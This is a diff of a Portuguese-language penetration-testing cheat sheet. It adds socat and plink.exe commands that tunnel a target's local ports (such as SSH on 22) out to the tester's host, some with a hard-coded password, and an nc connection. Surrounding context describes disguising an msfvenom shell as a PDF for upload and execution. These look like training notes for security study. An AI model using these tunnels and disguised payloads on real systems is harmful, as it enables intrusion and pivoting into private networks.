@@ -64,16 +64,36 @@ Depois você copia todo o arquivo de texto e cola na shell do servidor alvo
 
 Você cria uma shell através do msfvenom, transforma a shell no formato da aplicação (por exemplo, colocando o header do PDF e a extensão .pdf no arquivo), envia para a aplicação. Após isso você da um tail +number > newfile para transformar o arquivo em executável dentro da aplicação e executa esse arquivo
 
-### Tunelamento Linux
+## Tunelamento Linux
 
 ### SOCAT
 
+Enviar o tráfego da porta 22 local para porta 8443 do pentester
 
-### Tunelamento Windows
+```bash
+socat TCP4:IP-PENTESTER:8443 TCP4:127.0.0.1:22
+```
+---
+Deixa a porta 8443 escutando e direciona o que vir nela para a porta 2222
+
+```bash
+socat TCP4-LISTEN:8443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr
+```
+## Tunelamento Windows
 
 ### PLINK
 
-plink.exe --sh -l name -pw root -R pentester ip:port:target ip:port pentester ip
+```bash
+plink.exe -ssh -l name -pw root -R pentester ip:port:target ip:port pentester ip
+```
+---
+```bash
+plink.exe -ssh -l desec -pw root -R 192.168.0.8:1337:127.0.0.1:5555 192.168.0.8
+```
+
+```shell
+nc -v 127.0.0.1 1337
+```
 
 ## Windows Privilege Escalation
 
